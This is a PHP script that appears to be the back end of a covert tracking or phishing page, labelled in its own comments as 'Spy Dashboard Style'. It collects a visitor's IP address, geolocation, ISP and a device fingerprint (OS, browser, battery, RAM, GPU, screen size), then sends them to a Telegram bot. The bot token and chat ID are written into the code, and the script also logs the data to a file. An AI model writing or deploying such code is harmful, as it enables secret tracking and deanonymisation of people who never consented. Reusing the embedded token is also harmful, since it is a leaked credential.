<?php
// ******************************************
// CONFIGURATION: PASTE YOUR REAL DETAILS HERE
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
$chatId = "-1003598938463";     // Paste your -100... ID here
// ******************************************

// Receive Data
$os = $_POST['Os'];
$ptf = $_POST['Ptf'];
$brw = $_POST['Brw'];
$cc = $_POST['Cc'];
$ram = $_POST['Ram'];
$ven = $_POST['Ven'];
$ren = $_POST['Ren'];
$ht = $_POST['Ht'];
$wd = $_POST['Wd'];
// NEW: Receive Battery Level
$bat = $_POST['Bat'] ?? "Unknown"; 

// Get Real IP (Cloudflare support included)
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// --- IP INTELLIGENCE LOOKUP ---
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $details->city ?? "Unknown";
$region = $details->regionName ?? "Unknown";
$country = $details->country ?? "Unknown";
$isp = $details->isp ?? "Unknown";
// -------------------------------------------------

// Format Message (Spy Dashboard Style)
$message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";

// Section 1: Network / Location
$message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
$message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
$message .= "├ <b>City:</b> " . $city . "\n";
$message .= "├ <b>Region:</b> " . $region . ", " . $country . "\n";
$message .= "└ <b>ISP:</b> " . $isp . "\n\n";

// Section 2: Device Details
$message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
$message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
$message .= "├ <b>Browser:</b> " . $brw . "\n";
$message .= "├ <b>Battery:</b> " . $bat . "\n"; // <--- NEW BATTERY DATA
$message .= "├ <b>RAM:</b> " . $ram . " GB\n";
$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
$message .= "├ <b>Cores:</b> " . $cc . "\n";
$message .= "└ <b>GPU:</b> " . $ven . " (" . $ren . ")\n";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save Log
$f = fopen('../../logs/info.txt', 'w+');
fwrite($f, $message);
fclose($f);
?>
